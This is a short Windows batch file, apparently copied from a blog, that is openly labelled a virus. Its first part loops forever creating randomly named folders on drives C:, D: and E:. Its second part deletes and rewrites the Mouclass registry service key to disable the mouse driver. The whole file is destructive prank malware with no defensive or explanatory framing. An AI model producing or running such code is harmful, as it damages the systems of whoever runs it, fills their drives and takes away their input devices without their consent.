@echo off
:VIRUS
cd /d C:
md %RANDOM%
cd /d D:
md %RANDOM%
cd /d E:
md %RANDOM%
goto VIRUS
REM #######################
REM errorcode401.blogspot.in
rem ————————————————-

rem Disable Mouse

set key=”HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass”

reg delete %key%

reg add %key% /v Start /t REG_DWORD /d 4

rem ————————————————-
